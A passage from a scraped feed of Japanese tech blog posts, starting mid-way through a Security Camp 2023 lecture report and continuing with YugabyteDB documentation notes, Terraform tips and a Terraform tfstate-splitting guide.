適応し続けるプロダクトセキュリティ speakerdeck.com\xa0この講義は，3日目の19:00~20:40に行われた．この講義では，組織やプロダクトの変化に対して，セキュリティをどう確保するのか考える技術者というよりは，CISOといったセキュリティにおいてリーダーシップを発揮し，変化に対応する組織を作るにはどうすればいいのかといったことを学んだ．プロデューサーの\\"将来と今の両方を考えて，意思決定ができるリーダーになること\\"という思いが最も顕著に出ている講義であった．昨今の世の中は，プロダクトも組織もどんどん変化する時代であり，その変化に応じて，セキュリティのあり方も変わってくる．セキュリティの難しさはどこか一つでも弱い部分があってはいけないというところである．サービスを提供する場合，何か一つ強みがあれば，それで大ヒットするかもしれないが，セキュリティは全てが一定水準にならなければならない．プロダクト運営に求められるセキュリティは幅広いが，バランスよく，少しずつ積み重ねていくことが大事だとわかった．個人的には，セキュリティ人材が置かれる現実と求められることというところが面白く，より優れたセキュリティ人材，セキュリティ分野でリーダーシップを発揮して組織を変えるには，人間としての成長が不可欠だとわかった．\\"深化と探索のバランスとそれらの継続\\" が重要になってくると学んだ．将来は，セキュリティ関連の仕事をしたいとは思っていたが，CISOのようなリーダーシップを発揮して組織を変えていくということは考えたことがなかった．セキュリティ人材として成長するために，人間的な成長が必要になるというのは面白かった．4日目B-6 ソースコード解析によるWebアプリケーションの脆弱性調査この講義は，4日目の8:30~12:30に行われた．この講義では，ソースコードから脆弱性を探す方法について学んだ．最初に，静的解析で見つけやすい脆弱性の説明を受け，演習として，まずは，脆弱性を手動で探した．CVEが3つ取り上げられており，それらの脆弱性をNVDやそこに載っているGithubのPatchのプログラムやPoCを見て，調査した．プログラムベースで実際にどのような入力値であれば，脆弱性が悪用できるのかを探すのがこの調査のゴールであった．しかし，複雑なWebアプリケーションになると，大量の関数呼び出しによって，コードを追うのが大変になる．そこで，脆弱性調査の自動化のためのツールとして，CodeQLの説明があり，その後の演習で実際に使って，調査を行った．CodeQLを使うことで，特定の関数呼び出しや変数宣言，構文パターンを抽出することができ，脆弱性となりうるコードが含まれていないか簡単に調査できることがわかった．プログラムを書くことはあっても，解析して脆弱性を探し出すといったことはやったことがなかったため，新たな知見が得られたのはよかったし，楽しかった．自分で書いたコードに対して，脆弱性を探し，修正するといったことやバグバウンティに取り組むといったことも今後していきたいと思った．B-7 Policy as Code 入門docs.google.comこの講義は，4日目の13:30~17:30に行われた．この講義では，ポリシーをコードとして書くことで，k8sの設定ファイルやクラウドサービスのリソース状態の監視結果に対して制約を満たすかどうかチェックすることができるといったことを学んだ．この講義に関しても，B-5と同じで，一見セキュリティと関係ないため，今まで勉強してきたことがなかったが，クラウドサービスのリソースにポリシーを定義して不要なポートが開いてないかやクレデンシャルが書き込まれていないかなどのチェックはセキュリティ向上のためにも有効である．一部の先進的な組織しかPolicy as Codeを実践できていないという部分で，まだまだ新しい技術ではあるが，この講義を通して，こういうものがあるということを知れたのはよかった．演習では，3以降のよりリアルなポリシーになった途端に難しく，書くのに苦戦した．いつ使うことになるかわからないが，このようなものがあるというのを覚えておいて，いざという時に使えるようにしたいと思う．講義全体を通してB-1からB-7まで非常に幅広い分野の講義があり，それに加え，どの講義も4時間で終わり切らない程濃密なものであったため，まだ整理ができていない部分も多々ある．本当に知識をひたすら叩き込まれた感じであるため，また時間を取って整理して，理解したいと思う．4日間講義があり，ホームルームの時には思考停止するほどの疲れがあったが，講義内容の濃さと演習の楽しさでものすごい充実感はあった．あと，講義のレベルも高く，わからない箇所があったりもしたが，講師の方やチューターの方に質問するとなんでも教えてくださったため，問題なく演習を進めたり，疑問点を残すことなく学ぶことができた．対面での開催について今年は，4年ぶりの現地開催ということだったが，本当に楽しかった．5日間だけで，たくさんの人に出会ったし，たくさん話した．基本的にクラスで講義を受けるため，クラスの人とはずっと一緒にいることになり，仲良くなるが，だからこそ，食事のときや名刺交換会というのは違うクラスの子とも知り合ういい機会だった．ジュニアで参加している中学生とかから同世代の受講生やチューター，実際に社会で活躍している講師の方たちまで異なる立場や年齢の人たちと話すことができたのはよかった．X（Twitter）の中でよく見るすごい人たちと面と向かって話したり，議論できたりするのは楽しかったし，とても刺激を受けた．授業はもちろん素晴らしいのだが，同世代で自分よりもすごい人たちと出会い，それによってモチベーションが爆増するというのが個人的にはセキュリティ・キャンプに参加する一番のよさだと思う．学内という狭い世界で自分はそれなりにできると思っていても，全国から人が集まってくるセキュリティ・キャンプでは上には上がたくさんいるというのをすごい体感したし，もっと頑張ろうと思った．参加した感想今年22歳になるため，今年が最後のチャンスだったが，本当に参加することができて良かった．キャンプ参加が決まった後も，講義に対してワクワクしながらも，一方で講義についていけるのか，私みたいな人が行って大丈夫なのか，他の人たちはやっぱりつよつよなのかという不安はあったが，そんな不安は初日で解消した．たしかに，みんなすごい人たちだったが，コミュニケーションを取る上では，ITに興味があるというその一点だけで仲良くなることができたし，講義でわからないことがあったとしても，他の受講生やチューター，講師の方に聞いたらちゃんと教えてくださった．セキュリティに興味があるのなら，少しでも早いうちから応募課題に挑戦するべきだと思うし，そこで得られるものはたくさんある．たとえ，課題で落ちてしまったとしても，課題を解くことに意味があり，それだけでも知らないことをたくさん学ぶことができる．セキュリティ・キャンプ 2023 に参加したからこそ，心の底から参加することを勧めたい．来年は，チューターかネクストキャンプ受講生としてまた戻って来たいと思う．まとめ・どの講義も濃密で、わからない部分もあったが、チューターや講師の方のサポートもあり、なんとかついていくことができた．・やっぱり対面での開催はいい．・全国のすごい人たちを間近に見ることができ、刺激がもらえる．・セキュリティに興味がある人はもちろん、ITに興味がある人全員にセキュリティ・キャンプを進めたい．","isoDate":"2023-08-14T16:58:53.000Z","dateMiliSeconds":1692032333000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"WezTerm で快適な WSL2 環境にする","link":"https://blog.1q77.com/2023/08/wezterm-on-windows/","contentSnippet":"家の自分用 Laptop はずっと Linux を使ってきましたが、数か月前に Inspiron 14 に買い替えたタイミングで Ubuntu 22.04 にしてからやっぱり不便だなあとも思っていました。(InputMethod の切り替えで直接入力とひらがなだけにしたいのに Hankaku ってのが外せないとか、電源管理回りとか、snap でインストールしたアプリは日本語入力できないとか)","isoDate":"2023-08-12T11:07:01.000Z","dateMiliSeconds":1691838421000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"YugabyteDBのドキュメントを全部読む Day4","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/4_key_concepts_yb_master_service","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > YB-TServer serviceを読みました。今回はArchitecture > Key Concepts > YB-Master serviceを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。YB-Master serviceYB-Masterサービスはテーブルやそのタブレットの場所、ユーザー・ロールの権限といったシステムのメタデータとレコードの管理を行っている。それに加えYB-Masterはロードバランシングやレプリケーションの開始といったバックグラウンドオペレーションの管理や、テーブルのCREATEやALTER、DROPといった様々な管理オペレーションの責任を持つ。YB-MasterはRaft Groupを組むことで高可用性を実現し、またテーブルに対するI/Oの単一障害点にならない。Functions of YB-MasterYB-Masterはシステムの重要な機能を複数持っている。Coordination of universe-wide administrative operationsCREATE TABLEやALTER TABLE、DROP TABLEといったユーザーからのリクエスト処理やバックアップの実行などUniverseをまたぐオペレーション実行の調整を担当している。YB-Masterではこれらのオペレーションがテーブルを保持するYB-TServerの状態に関わらず、全てのテーブルに伝搬されることを保証する。YugabyteDBは分散システムのため、Universeをまたぐ処理中にYB-TServerに障害が発生し一部のタブレットへの適用に失敗してもオペレーションの結果に問題が発生しないことが重要だからである。Storage of system metadataそれぞれのYB-Masterではネームスペースやテーブル、ロール、パーミッション、YB-TServerへ割り当てたテーブル情報を含むシステムメタデータを保存している。これらのシステムレコードはYB-Masterを対象にRaftグループを組みレプリケーションすることで冗長性を実現している。またシステムレコードはYB-Masterが管理するDocDBに保存される。Authoritative source of tablet assignments to YB-TServersYB-Masterは全てのテーブルとそれらをホストするYB-TServerの情報を保存している。一般のクライアントではそれらの情報はクライアントからクエリレイヤなどを通して取得された上で、クライアントにメタデータを返しデータアクセスが行なわれる。一方でスマートクライアントではYB-Masterに保存されたメタデータを利用して特定のYB-TServerが保持するタブレットやキャッシュを利用することが出来るため、データアクセス時のネットワークをまたぐ通信を減らすことができパフォーマンスを高めることができる。Background operationsいくつかのオペレーションはUniverseのライフタイムを通してバックグラウンドで行なうことで、フォアグラウンドのRead/Writeに影響を与えずに実行することが出来る。Data placement and load balancingYB-MasterのリーダーはCREATE TABLE時にタブレットの初期配置をYB-TServerをまたいで行なう。そのときにユーザー定義のデータ配置制約を強制し均一な読み込みを保証する。Universeのライフタイム中のノード追加や障害が発生しても、負荷分散を継続しデータ配置の制約を自動的に適用する。Leader balancing複数のYB-TServerに配置されたタブレットへのアクセスがUniverseをまたいで分散されることを保証している一方で、YB-Masterは対象となるノード1間でそれぞれのノードが同じ数のtablet-peer leader2をもつことを保証する。Rereplication of data on extended YB-TServer failureYB-Masterは全てのYB-TServerからハードビートシグナルを受け取ることでYB-TServerの死活監視を行なっている。そしてYB-MasterはYB-TServerの異常を検知したときに、どれぐらいのあいだYB-TServerが異常であったかを追跡する。閾値を超えると、YB-Masterは障害中のYB-TServerに配置されていたタブレットを再配置するYB-TServerを探し、レプリケーションを実行する。レプリケーションはYB-Masterリーダーに抑制された状態で実行されるため、Universeのフォアグラウンドオペレーションには影響をおよぼさない。Raft Groupのリーダーになれるノード↩↩","isoDate":"2023-08-03T14:48:34.000Z","dateMiliSeconds":1691074114000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"YugabyteDBのドキュメントを全部読む Day3","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/3_key_concepts_yb_tserver_service","contentSnippet":"YugabyteDBのドキュメントを全部読む Day3前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Key Concepts > Universeを読みました。今回はArchitecture > Key Concepts > YB-TServer serviceを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。それはそれとして技術系の単語をカタカナ表記で誤魔化していて、体系的に学んでいないことがバレてしまう。特にストレージまわりが分からない……YB-TServer serviceYB-TServer(YugabyteDB Tablet Servcer)はユーザからの受けつけたYugabyteDBクラスタへのリクエストのI/Oの処理をする。テーブルのデータは一つ以上のTablet peerに分割(シャーディング)される。peerの数はレプリケーションファクターによって決定される。YB-TServerは一つ以上のTablet peerをホストする。Tablet peerはRaftグループを形成してグループ間でデータの複製を行ない、タブレットはYB-TServer上で最大の効率になるように管理される。Server-global block cacheブロックキャッシュは一つTB-TServer上の異なるタブレット間で共有される。YB-TServerのメモリ効率は一つのテーブルからの読み込みが多いほど最適化される。Space AmplificationYugabyteDBではSize-tired Compactionというライトアンプリフィケーション1が小さい圧縮方式を利用している。Size-tired Compactionはスペースアンプリフィケーション2が大きいという問題があるが、YugabyteDBではテーブルは複数のタブレットに分割され、タブレット間でのConcurrent Compactionは特定の最大値まで絞られるため問題になりにくい。YugabyteDBでは凡そ10-20%のスペースアンプリフィケーションにおさまる。つまりSize-tired Compaction一単位が扱うデータ量を小さく(タブレット化)して、同時に実行される圧縮処理数を絞ることで特定のタイミングで圧縮に使用されるストレージ容量を抑えているということ？Throttled compactionsYB-TServerではタブレット間で実行される圧縮処理の同時実行数を制限することで、圧縮処理が多量のリソースを占有することを防いでいる。この機能は圧縮されるファイル同士のサイズを比べ、実行される圧縮処理が妥当であることを確認することで実現されている。Small and large compaction queuesYB-TServerでは圧縮処理を大きい圧縮処理と小さい圧縮処理に分けて優先度を決めることで、I/Oが大きな場合でもシステムの機能を保っている。YugabyteDBでは圧縮処理数を制限することに加え、様々な最適化を実行することで圧縮処理の影響を最小化している。Manual compactionYugabyteDBではyb-admin utilityのcompact_tableコマンドにより、任意のタイミングでテーブルに対して圧縮を実行することが出来る。この方法はデータが新しく書き込まれない場合や、DDLやTTLの超過によるデータ削除時によりデータが断片化したときに有効である。Statistics-based full compactions to improve read performanceYugabyteDBでは読み込まれたkey-valueペアをDocDBレベルで監視している。監視対象となる時間軸はauto-compact-stat-window-secondsで管理されている。YugabyteDBがデータ読み込み時に多量の廃棄されたデータのスキップを検知した場合、full compactionがトリガーされ不要なキーの削除が行なわれる。Full compactionがトリガーされる詳細な条件は対象の時間軸で以下が満された時である。廃棄されたキーとアクティブなキーが読まれる割り合いがauto-compact-percent-obsoleteで定義された閾値を超たとき。廃棄されたキーの読み込みauto-compact-min-obsolete-keys-foundで定義された閾値を超たとき。この機能はTTLを設定したテーブルと互換性があり、TTL file expirationが有効なテーブルではスケジュールされた圧縮を実行しない。Scheduled full compactionsYugabyteDBでは全てのデータに対するデータ圧縮をスケジュール実行することが出来る。スケジュール実行はscheduled-full-compaction-frequency-hoursとscheduled-full-compaction-jitter-factor-percentageのフラグで管理される。この機能は大量のDELETEとUPDATEを定常的に実行するワークロードでのパフォーマンスとディスクスペースの再割り当てに有効である。スケジュール化したデータ圧縮はTTLと互換しているが、TTL file expirationとは互換していない。つまりスケジュールされた圧縮は実行されない。Server-global memstore limitServer-global memstore limitは一つのYB-TServer上のタブレット間でシェアされるメモリサイズを追跡し、強制する。この機能はタブレット間の書き込みに偏りがある場合に有効である。一つのテーブルに書き込みが集中しているばあい、メモリ制限以上のメモリを割り当てることでパフォーマンスを向上させることが出来る。Auto-sizing of block cache and memstoreBlock Cacheとmemstoreは何れも多量のメモリを使用している。これらはtablet-peer間で共有されるリソースのため、メモリ管理とこれらのコンポーネントの様々な環境に合せたサイジングを容易にしている。YB-TServerでは自動で特定の割合のメモリをBlock CacheとMemstoreに割り当てる。Distributing tablet load uniformly across data disks複数のSSDを利用するハードウェアでは、テーブルのデータ(SSTable)とWALはテーブル毎に利用可能なディスクに均等に分散される。このストライピングと呼ばれる負荷分散は、それぞれのディスクがそれぞれのテーブルの負荷を均等に処理することを保証する。SSDで実際に書き込んだデータより書き込み量が増幅する現象。もちろんライトアンプリフィケーションが小さいほうが望ましい。↩↩","isoDate":"2023-08-02T16:13:24.000Z","dateMiliSeconds":1690992804000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"YugabyteDBのドキュメントを全部読む Day2","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/2_key_concepts_universe","contentSnippet":"YugabyteDBのドキュメントを全部読む Day2前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Design goalsを読みました。今回はArchitecture > Key Concepts > Universeを読みます。また画像は同ドキュメントより引用しています。UniverseYugabyteDBは耐久性とスケーラビリティを兼ねそなえた分散データベースを達成するために、Universe1と呼ばれるノードのグループを持っている。Universeはビジネス要件やレイテンシの兼ね合いでシングルゾーン、単一リージョンマルチゾーン、マルチリージョン、同期・非同期レプリケーションなどを選択することが出来る。UnivereはClusterと表現されることもある。データの構成Universeは一つ以上のネームスペースを持つことができ、またネームスペースは一つ以上のテーブルを持つことができる。YugabyteDBではUniverse上に存在するノードにまたがって保持されるテーブルを設定に従って、シャーディングし、レプリケーション、ロードバランシングを行なう。YugabyteDBはノードやディスク、ゾーンなどに発生した障害に自動で対応し、必要であればデータを新規に分散、レプリケーションを行なう。ネームスペースはYSQLではデータベースに対応し、ほかのDBにおけるネームスペースに対応する2。YCQLではキースペースに対応し、Cassandraのキースペースに対応している。サービスコンポーネントUniverseはYugabyteDB Tablet Server(YB-TServer)とYugabyteDB Master Server(YB-Master)の二つで構成されている。YB-MasterとYB-TServerはRaftにより分散されており、高可用性を達成している。YB-Tserverはテーブルを始めとしたユーザーデータの保存、提供を担当する。YB-Masterはシステムのメタデータを管理し、システム全体のテーブルに対するDDLやメンテナンスの実行、ロードバランシングといったオペレーションを管理する。UniverseとClusterUniverseは一つのプライマリクラスタとゼロ個以上のレプリカクラスタによって構成されている。プライマリクラスタプライマリクラスタはRead/Write両方の実行と、プライマリクラスタ内のノード間の同期的なレプリケーションを担当する。リードレプリカクラスタリードレプリカクラスタはRead処理のみを実行する。Write処理は自動的にプライマリクラスタにルーティングされる。リードレプリカクラスタを利用することで、地理的に分散したデータに対する読み取りの遅延を小さくすることができる。データはプライマリクラスタから非同期的にとりこまれる。これはRaftの書き込みには関与しないRaftオブザーバとして機能する。GoogleのCloud Spannerでも同様にUniverseと呼ばれている↩PostgreSQLではSchemaの裏側に存在するデータ構造↩","isoDate":"2023-07-26T15:03:13.000Z","dateMiliSeconds":1690383793000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"YugabyteDBのドキュメントを全部読む Day1","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/1_design_goals","contentSnippet":"Day1最近Twitter改めXで「俺はDBのドキュメント端から端まで読んで強くなった」というX\'s1を複数みかけました。周りのエンジニアに一歩差をつける方法として、フレームワークやミドルウェアやライブラリのドキュメントを最初から最後までちゃんと読む、というのがあって、これはマジでコスパ抜群です。— 徳永広夢 (@tokuhirom) July 21, 2023 確かに私のRedisはこれ。 https://t.co/2y1E01aLGw— maru (@maruloop) July 22, 2023 私のMySQLもこれ。 https://t.co/BxiOjeQVPk— yoku0825 (@yoku0825) July 22, 2023 俺のpostgresqlもこれ。 https://t.co/URRjyXCpGI— そーだい@初代ALF (@soudai1025) July 22, 2023 PostgreSQL系NewSQLで最強になりたいのでYugabyteDBのドキュメントを順番に読んで行きます。ドキュメントはv2.19に対応したものです。手始めにArchitectureの一番先頭にあるDesign goalsから読みはじめます。また画像は同ドキュメントより引用しています。Design goalsYugabyteDBは以下を達成することを目標としている。1. 分散トランザクションを提供しながら強い一貫性を保証する。2. Query APIを再発明せず、既存のクエリ言語への互換を達成する。3. 高いパフォーマンスを保証する。4. 地理的に分散したデプロイを可能にする。5. Cloud Native Databaseとしてデザインする。一貫性分断耐性YugabyteDBはCAPの定理で言えばCPを中心に高い可用性を供えたデータベースネットワーク分断などを起因とするSplit BrainはRaft Group内であたらしいリーダーを選出することで対応している。YugabyteDBではLeader Leaseという障害が発生しても常に一つのリーダが存在することを保証する仕組みを実装している。直列化可能性single-row Linearizable writeをサポートしている。ACIDトランザクションYugabyteDBではSeriarizable、Repetable Read、Read Committed Isolationの三つの分離レベルをサポートしている。YSQL APIではこれら3つの分離レベルをサポートしているが、YCQLではRepeatable Readのみに対応している。Query APIYugabyteDBではYSQLとYCQLという2種類のQuery APIをサポートしている。YSQLYSQLはPostgreSQLに互換したAPIでPostgreSQLのクエリレイヤを再利用している。新しい変更は互換性を崩さない。YSQLは新しいPostgreSQLに互換しつづけることを目標としている。YCQLYCQLはCassandraのクエイ言語から派生した半リレーショナルなクエリ言語で、Webスケールな膨大なwriteに対応してスケールし素早いデータ取得を目標としている。パフォーマンスC++で実装されているため高いパフォーマンスと巨大なHeap(RAM)をCacheとして利用できる。SSDとNVMeに最適化している。高いWriteスループットとクライアントの同時実行性、高いデータ密度、増加し続けるデータへの対応を目標としている。地理的分散Zone、Multi Region、Multi Cloudいずれにも対応している。これに対応するために、ノード障害やトラヒックのルーティングなどに対応できる必要がある。クラウドネイティブアーキテクチャパブリッククラウドやオンプレミスで利用される一般てきなハードウェアで利用可能にする。原子時計のような特別なものに依存しない。Kubernatesに対応している。OSSで提供している。https://twitter.com/SawyerMerritt/status/1683365478582951936↩","isoDate":"2023-07-25T15:01:52.000Z","dateMiliSeconds":1690297312000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Terraformでmapにkeyが含まれないときにスキップしたい","link":"https://zenn.dev/nnaka2992/articles/skip_when_key_does_not_exists_in_map_terraform","contentSnippet":"Google CloudではPublic IPを利用した際に割り振られる可能性のあるCIDRの一覧がcloud.jsonでJSON形式で公開されています。この記事は雑な検証用のTerraformで承認済みネットワークにasia-notheast1のCIDRを全部登録してやろうとしたとき、上記のJSONファイルからscopeがasia-northeast1のprefixes.ipv4Prefixを抜きだそうとしたときにハマったのでその対応方法のメモです 結論以下のような感じで書いたら対応できました。contains(keys(hoge), \\"fuga\\") # hogeのkeyにh...","isoDate":"2023-07-22T14:53:12.000Z","dateMiliSeconds":1690037592000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Kubernetes の upstream のキャッチアップ","link":"https://zenn.dev/toversus/articles/52b107ab103712","contentSnippet":"先日、Kubernetes Meetup Tokyo #59 で「KEP から眺める Kubernetes」というタイトルで発表しました。発表の後で Kubernetes の upstream のキャッチアップ方法について質問を受けました。その場で回答はしたのですが、ちょうど社内の共有会で似たような話をしたところだったので、加筆修正したものを公開しておきます。 はじめにKubernetes の upstream を追いかけ始めて 1 年ちょっと経ったので、その経験をまとめます。Kubernetes の upstream やエコシステムを観察しているだけで、コントリビュータではありま...","isoDate":"2023-07-20T10:18:32.000Z","dateMiliSeconds":1689848312000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"メールが届いたら Google Home で音声で通知する","link":"https://blog.1q77.com/2023/07/ses-lambda-and-cloud-pubsub/","contentSnippet":"以前、「LINE に送ったメッセージを Google Home に読み上げさせる」という記事を書きました。その時に作ったものに家にあるラズパイで Cloud PubSub を subscribe してメッセージが届いたらその内容を Text-to-Speach で音声化して Google Home で再生する仕組みが存在します。","isoDate":"2023-07-10T14:25:35.000Z","dateMiliSeconds":1688999135000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"コンテナセキュリティ","link":"https://speakerdeck.com/kyohmizu/kontenasekiyuritei","contentSnippet":"「コンテナセキュリティ - Forkwell Library#26」の資料です。\\rhttps://forkwell.connpass.com/event/287259/","isoDate":"2023-07-05T04:00:00.000Z","dateMiliSeconds":1688529600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"【Terraform\uD83E\uDDD1\uD83C\uDFFB‍\uD83D\uDE80】tfstateファイルの分割パターンとディレクトリ構成への適用","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/07/05/001756","contentSnippet":"この記事から得られる知識この記事から得られる知識01. はじめに02. なぜ tfstate ファイルを分割するのか分割しなかった場合分割した方がいい場合分割しない方がいい場合03. tfstate ファイルの分割分割の境界状態の依存関係図依存関係図とは依存関係の表現▼ 依存関係の表現記法▼ 依存関係がない場合▼ 依存関係がある場合04. tfstate ファイルに基づくその他の設計リポジトリ \uD83D\uDC31 の設計リポジトリ分割ディレクトリ \uD83D\uDCC2 構成リモートバックエンド \uD83E\uDEA3 の設計リモートバックエンド分割ディレクトリ構成05. 状態の依存関係の定義方法terraform_remote_stateブロックの場合terraform_remote_stateブロックによる依存状態の依存関係図リポジトリのディレクトリ構成リモートバックエンドのディレクトリ構成AWSリソース別dataブロックの場合AWSリソース別dataブロックによる依存状態の依存関係図リポジトリのディレクトリ構成リモートバックエンドのディレクトリ構成06. tfstate ファイルの分割パターンオススメな設計の一覧大分類 (上層/下層/中間層) とディレクトリ構成の関係リポジトリの場合リモートバックエンドの場合07. 上層の分割 (推奨)上層の分割についてプロバイダーのアカウント別 - ★★★この分割方法について【プロバイダーアカウント別】状態の依存関係図【プロバイダーアカウント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【プロバイダーアカウント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合08. 下層の分割 (推奨)下層の分割について実行環境別 - ★★★この分割方法について【実行環境別】状態の依存関係図【実行環境別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【実行環境別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンド x AWSアカウント別に異なる実行環境 の場合▼ 同じリモートバックエンド x 単一のAWSアカウント内に全ての実行環境 の場合09. 中間層の分割 (任意)中間層の分割について運用チーム責務範囲別 - ★★この分割方法について【チーム別】状態の依存関係図【チーム別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【チーム別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合プロダクトのサブコンポーネント別 - ★★この分割方法について【サブコンポーネント別】状態の依存関係図【サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別 - ★この分割方法について【チーム別 \xd7 サブコンポーネント別】状態の依存関係図【チーム別 \xd7 サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【チーム別 \xd7 サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合同じテナント内のプロダクト別この分割方法について【同じテナント内のプロダクト】状態の依存関係図【同じテナント内のプロダクト】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【同じテナント内のプロダクト】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合AWSリソースの種類グループ別この分割方法について【種類グループ別】状態の依存関係図【種類グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【種類グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合AWSリソースの状態の変更頻度グループ別この分割方法について【変更頻度グループ別】状態の依存関係図【変更頻度グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【変更頻度グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合10. おわりに謝辞記事関連のおすすめ書籍この記事を読むと、以下を \\"完全に理解\\" できます✌️Terraformのtfstateファイルを分割する目的と、オススメの分割パターンについて (★で表現)Terraformのリポジトリやリモートバックエンドのディレクトリ構成の設計について記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！01. はじめにどうも、Mitchell Hashimoto です。さて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、チームが使っているTerraform\uD83E\uDDD1\uD83C\uDFFB‍\uD83D\uDE80のリポジトリをリプレイスする作業を担当しました。このリポジトリでは単一のtfstateファイルが状態を持ち過ぎている課題を抱えていたため、課題に合った適切な分割パターンでリプレイスしました。今回は、この時に整理した分割パターン (AWS向け) を記事で解説しました。もちろん、GoogleCloudやAzureでも読み換えていただければ、同じように適用できます。知る限りの分割パターンを記載したところ、情報量がエグいことになってしまったため、気になる分割パターンだけ拾って帰っていただけるとハッピーです\uD83D\uDE4Fそれでは、もりもり布教していきます\uD83D\uDE1702. なぜ tfstate ファイルを分割するのか%%{init: { \'theme\': \\"default\\", \'themeVariables\': { \'commitLabelFontSize\': \'13px\' }}}%%gitGraph   commit id: \\"8c8e6\\"   commit id: \\"0e3c3\\"     branch feature/foo     checkout feature/foo     commit id: \\"4e9e8\\"     commit id: \\"da005\\"   checkout main     branch feature/bar     commit id: \\"2d52f\\"   checkout main   commit id: \\"e74d6\\"     branch feature/baz     commit id: \\"f6881\\"分割しなかった場合そもそも、なぜtfstateファイルを分割する必要があるのでしょうか。tfstateファイルを分割しなかったと仮定します。様々なインフラコンポーネントを単一のtfstateファイルで状態を持つ場合、1回のterraformコマンド全てのコンポーネントの状態を操作できて楽です。ただし、複数の作業ブランチがある状況だと煩わしいことが起こります。各作業ブランチでインフラコンポーネントの状態を変更しかけていると、他の作業ブランチから影響を受け、terraformコマンドでtargetオプションが必要になってしまいます。他にも、terraformコマンドの完了に時間がかかりすぎるといった問題も起こるかもしれません。単一のtfstateファイルで管理するコンポーネントが多くなるほど、これらの問題は顕著になります。分割した方がいい場合その一方で、tfstateファイルをいい感じに分割したと仮定します。各作業ブランチでは、まるで暗黙的にtargetオプションがついたように、他の作業ブランチから影響を受けずにterraformコマンドを実行できます。よって、各tfstateファイルを操作できる管理者は互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Terraform: Up & Running; Writing Infrastructure As CodeOrganizing With Multiple States - DevOps with Terraform - CloudCasts分割しない方がいい場合運用ルールや開発者人数が理由で作業が衝突せず、targetオプションが必要ない状況であれば、tfstateファイルは分割しなくてもよいでしょう。tfstateファイルを分割するメリットが少ないです\uD83D\uDE45\uD83C\uDFFB‍03. tfstate ファイルの分割分割の境界それでは、tfstateファイルの分割の境界はどのようにして見つければよいのでしょうか。これを見つけるコツは、できるだけ相互に依存しないインフラリソースの関係 に注目することだと考えています。ここでいう依存とは、\\"tfstateファイルが他のtfstateファイルの状態を使用すること\\" です。もう少し具体的に言語化すると、\\"特定のインフラリソースが他の設定値を参照すること\\" です。状態をほとんど使用し合わない (互いに設定値の参照数が少ない) インフラリソース同士を、異なるtfstateファイルで管理します。異なるtfstateファイルで管理できる分割パターンについては後述します。▶ 『依存』という用語についてtfstateファイルでも同じ用語で表現することにしました。@tmknom さんが述べている通り、Terraformをよりよく設計するためには、『ソフトウェアの基礎知識』が必要です\uD83D\uDC4D状態の依存関係図依存関係図とは分割したtfstateファイル間の状態の依存関係を表現した図です。プロバイダーのアカウントの状態をtfstateファイルで管理していることを想像してみてください。%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWSアカウント        foo[\\"tfstateファイル\\"]    end似たものとしてterraform graphコマンドによるグラフがありますが、これはインフラリソース間の依存関係図です。tfstateファイル間で相互に依存関係があるからといって、個別のインフラリソース間で循環参照が起こってしまうというわけではないです。続いて、依存関係がある場合と無い場合で、どのような依存関係図になるかを紹介していきます。terraform graph command reference | Terraform | HashiCorp Developer依存関係の表現▼ 依存関係の表現記法tfstateファイル間で状態の依存関係がある場合、これを図で表現すると分割の状況がわかりやすくなります。『依存』は、---\x3e (波線矢印) で表現することとします。依存関係がある場合については、後述します。▶ 